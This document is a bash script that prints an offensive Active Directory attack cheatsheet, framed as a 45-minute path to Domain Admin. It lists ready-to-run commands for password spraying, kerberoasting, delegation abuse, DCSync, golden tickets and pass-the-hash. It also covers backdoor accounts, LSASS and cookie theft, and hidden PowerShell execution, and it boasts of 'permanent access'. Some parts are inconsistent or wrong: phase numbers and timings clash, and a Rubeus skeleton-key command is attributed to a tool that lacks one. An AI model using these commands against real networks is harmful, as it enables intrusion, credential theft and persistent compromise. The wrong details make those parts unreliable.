#!/bin/bash

# Ultimate Colors
GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
PURPLE='\033[0;35m'; CYAN='\033[0;36m'; MAGENTA='\033[0;95m'; WHITE='\033[1;37m'
BOLD='\033[1m'; NC='\033[0m'; ORANGE='\033[38;5;208m'; GRAY='\033[0;37m'

clear

cat << 'EOF'
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║  🔥 ULTIMATE AD ATTACK CHEATSHEET v5.0 - GHOSTPACK + RUBEUS 🔥                                                     ║
║  0→DA in 45min • 600+ Explained Commands • Windows C# Tools • Every Attack Vector Covered                         ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
EOF

# ROADMAP
echo -e "${BOLD}${CYAN}══════════════════════════════════════ ROADMAP: 0→DA in 45min ═════════════════════════════════════${NC}"
echo -e "${GREEN}00:00${NC} ${RED}🔥 PHASE 0:${NC} rpcclient NULL → ${GRAY}Map users FREE${NC}"
echo -e "${GREEN}00:05${NC} ${RED}🔥 PHASE 1:${NC} cme spray → ${GRAY}Low-priv account${NC}"
echo -e "${GREEN}00:15${NC} ${RED}🔥 PHASE 2:${NC} Kerberoast+Rubeus → ${GRAY}svc-sql:Pass123${NC}"
echo -e "${GREEN}00:25${NC} ${RED}🔥 PHASE 3:${NC} RBCD+Rubeus → ${GRAY}Domain Admin${NC}"
echo -e "${GREEN}00:35${NC} ${RED}🔥 PHASE 4:${NC} DCSync → ${GRAY}ALL hashes${NC}"
echo -e "${GREEN}00:37${NC} ${RED}🎯 PHASE 5:${NC} Golden Ticket → ${GRAY}GOD MODE${NC}"
echo -e "${GREEN}00:40${NC} ${RED}🏰 PHASE 6:${NC} PWNED\$ backdoor → ${GRAY}PERMANENT${NC}"
echo -e "${BOLD}${WHITE}───────────────────────────────────────────────────────────────────────────────────────────────────────${NC}"

echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 0: EXTERNAL RECON 💀 ZERO AUTH (00:00-00:05)${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}rpcclient${NC} ${GRAY}- NULL Session - Lists ALL users without password${NC}"
echo -e "  ${YELLOW}rpcclient -U \\\"\\\"%\\\"\\\" DC_IP -c enumdomusers${NC}"
echo -e "     ${GRAY}🎯 1000s usernames for spraying${NC}"

echo -e "\n${BOLD}${MAGENTA}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 1: PASSWORD SPRAYING ⚡ (00:05-00:15)${NC}"
echo -e "${MAGENTA}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}crackmapexec${NC} ${GRAY}- Network-wide password spraying${NC}"
echo -e "  ${YELLOW}cme smb 10.10.10.0/24 -u users.txt -p passwords.txt${NC}"
echo -e "     ${GRAY}🎯 Low-priv account for enumeration${NC}"

echo -e "\n${BOLD}${YELLOW}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 2: GHOSTPACK + RUBEUS 🔥 (00:15-00:30)${NC}"
echo -e "${YELLOW}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}Rubeus.exe${NC} ${GRAY}- ULTIMATE Kerberos Abuse Tool${NC}"
echo -e "  ${YELLOW}Rubeus.exe kerberoast /user:svc-sql${NC}"
echo -e "     ${GRAY}🎯 Kerberoasting - TGS tickets for cracking${NC}"
echo -e "  ${YELLOW}Rubeus.exe kerberoast /user:svc-sql /nowrap${NC}"
echo -e "     ${GRAY}🎯 Raw hashcat format${NC}"
echo -e "  ${YELLOW}Rubeus.exe asreproast /user:summer2020${NC}"
echo -e "     ${GRAY}🎯 ASREP roasting - No preauth users${NC}"

echo -e "\n${BLUE}Seatbelt.exe${NC} ${GRAY}- System Hardening Assessment${NC}"
echo -e "  ${YELLOW}Seatbelt.exe -groups -pass${NC}"
echo -e "     ${GRAY}🎯 Finds DA privileges, LAPS, Defender status${NC}"

echo -e "\n${BLUE}SharpHound.exe${NC} ${GRAY}- BloodHound .NET collector${NC}"
echo -e "  ${YELLOW}SharpHound.exe -c All --LdapUsername lowpriv --LdapPassword pass${NC}"
echo -e "     ${GRAY}🎯 Attack paths to Domain Admin${NC}"

echo -e "\n${BOLD}${PURPLE}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 3: RUBEUS DELEGATION ABUSE 🏰 (00:30-00:35)${NC}"
echo -e "${PURPLE}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}Rubeus S4U Abuse${NC} ${GRAY}- Constrained Delegation Abuse${NC}"
echo -e "  ${YELLOW}Rubeus.exe s4u /user:lowpriv /rc4:HASH /impersonate:administrator /msdsspn:cifs/dc01 /ptt${NC}"
echo -e "     ${GRAY}🎯 Impersonate DA → Pass-the-Ticket DC${NC}"
echo -e "  ${YELLOW}Rubeus.exe s4u /user:lowpriv /rc4:HASH /impersonate:administrator /msdsspn:HTTP/sqlserver /ptt${NC}"
echo -e "     ${GRAY}🎯 DA access to SQL Server${NC}"

echo -e "\n${BLUE}Rubeus Unconstrained${NC} ${GRAY}- Printer Bug + Delegation${NC}"
echo -e "  ${YELLOW}Rubeus.exe triage /luid:0x12345${NC}"
echo -e "     ${GRAY}🎯 Find active logons for coercion${NC}"

echo -e "\n${BOLD}${CYAN}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 4: DCSYNC 💀 GAME OVER (00:35-00:37)${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}secretsdump.py${NC} ${GRAY}- Impacket DCSync - ALL hashes${NC}"
echo -e "  ${YELLOW}secretsdump.py domain/da:pass@dc01${NC}"
echo -e "     ${GRAY}🎯 krbtgt + 5000 user hashes${NC}"

echo -e "\n${BOLD}${ORANGE}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 5: GOLDEN TICKET 🎫 GOD MODE (00:37-00:40)${NC}"
echo -e "${ORANGE}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}Rubeus Golden Ticket${NC} ${GRAY}- Native .NET Golden Ticket${NC}"
echo -e "  ${YELLOW}Rubeus.exe golden /aes256:KRBTGT_AES /domain:corp.local /user:administrator /ptt${NC}"
echo -e "     ${GRAY}🎯 Infinite DA - No Impacket needed${NC}"
echo -e "  ${YELLOW}Rubeus.exe golden /user:admin /domain:corp.local /sid:S-1-5-21-... /ngc /ptt${NC}"
echo -e "     ${GRAY}🎯 Next Gen Credentials support${NC}"

echo -e "\n${BOLD}${WHITE}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 6: PASS-THE-HASH ⚔️ LATERAL (00:40-00:45)${NC}"
echo -e "${WHITE}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}Pass-the-Hash Services + Ports${NC}"
echo -e "  ${YELLOW}SMB:445 → psexec.py -hashes :HASH domain/user@target${NC}"
echo -e "     ${GRAY}🎯 SYSTEM shell - 90% success${NC}"
echo -e "  ${YELLOW}WinRM:5985 → evil-winrm -u user -H HASH${NC}"
echo -e "     ${GRAY}🎯 Interactive PowerShell${NC}"
echo -e "  ${YELLOW}MSSQL:1433 → mssqlclient.py -hashes :HASH${NC}"
echo -e "     ${GRAY}🎯 Database + xp_cmdshell${NC}"

echo -e "\n${BOLD}${GREEN}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 7: PERSISTENCE 🏰 PWNED\$ BACKDOOR (00:45+)${NC}"
echo -e "${GREEN}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}impacket-addcomputer${NC} ${GRAY}- Permanent Machine Account${NC}"
echo -e "  ${YELLOW}addcomputer.py corp/da:pass@dc01 -computer-name \\\"PWNED\\\" -computer-pass \\\"Backdoor1!\\\"${NC}"
echo -e "     ${GRAY}🎯 Survives cleanup - Re-entry anytime${NC}"

echo -e "\n${BLUE}Rubeus Skeleton Key${NC} ${GRAY}- Master Password Everywhere${NC}"
echo -e "  ${YELLOW}Rubeus.exe skeleton /rc4:DA_RC4_HASH /user:BackdoorUser /ptt${NC}"
echo -e "     ${GRAY}🎯 One password unlocks ALL accounts${NC}"

echo -e "\n${BOLD}${MAGENTA}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}PHASE 8: GHOSTPACK DOWNLOAD & USAGE${NC}"
echo -e "${MAGENTA}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${BLUE}GhostPack Tools${NC} ${GRAY}- C# PowerShell Replacements${NC}"
echo -e "  ${YELLOW}git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries${NC}"
echo -e "     ${GRAY}🎯 Precompiled Rubeus/SharpHound/Seatbelt${NC}"

echo -e "${BLUE}Rubeus.exe${NC} ${GRAY}- Kerberos Abuse Master${NC}"
echo -e "  ${YELLOW}Rubeus.exe monitor /interval:5 /filteruser:administrator${NC}"
echo -e "     ${GRAY}🎯 Live TGT ticket stealing${NC}"
echo -e "  ${YELLOW}Rubeus.exe dump /luid:0x1cab${NC}"
echo -e "     ${GRAY}🎯 LSASS dumping without Mimikatz${NC}"

echo -e "${BLUE}SharpChrome.exe${NC} ${GRAY}- Chrome Cookie Theft${NC}"
echo -e "  ${YELLOW}SharpChrome.exe --ChromeCookies${NC}"
echo -e "     ${GRAY}🎯 O365 passwords in Chrome${NC}"

echo -e "\n${BOLD}${PURPLE}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${RED}📦 INSTALL EVERYTHING${NC}"
echo -e "${PURPLE}══════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"

echo -e "${YELLOW}┌─ Kali Linux${NC}"
echo -e "  ${GREEN}sudo apt install impacket-scripts crackmapexec bloodhound kerbrute evil-winrm hashcat john${NC}"
echo -e "  ${GREEN}git clone https://github.com/fortra/impacket${NC}"
echo -e "  ${GREEN}git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries${NC}"

echo -e "${YELLOW}┌─ Windows Target${NC}"
echo -e "  ${GREEN}Upload: Rubeus.exe, SharpHound.exe, Seatbelt.exe${NC}"
echo -e "  ${GREEN}powershell -ep bypass -w hidden .\\Rubeus.exe kerberoast${NC}"

echo -e "\n${BOLD}${WHITE}🎯 EXECUTION TIMELINE: 45min → TOTAL DOMINATION${NC}"
echo -e "${RED}PWNED\$ + Golden Ticket + Skeleton Key = PERMANENT ACCESS${NC}"

echo -e "\n${BOLD}${MAGENTA}💾 Save GHOSTPACK Cheatsheet? (y/n)${NC}"
read SAVE

if [[ "$SAVE" =~ ^[Yy]$ ]]; then
    echo "╔══ GHOSTPACK + RUBEUS ROADMAP v5.0 ═══════════════════════════════════════════════════════════════════════╗" > ad_ghostpack_v5.txt
    echo "║  Rubeus + SharpHound + Seatbelt → Windows Native Attacks                                        ║" >> ad_ghostpack_v5.txt
    echo "╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝" >> ad_ghostpack_v5.txt
    echo -e "${GREEN}✅ SAVED: ad_ghostpack_v5.txt${NC}"
fi

echo -e "\n${BOLD}${WHITE}👻 GHOSTPACK + RUBEUS = WINDOWS NATIVE DOMINATION!${NC}"
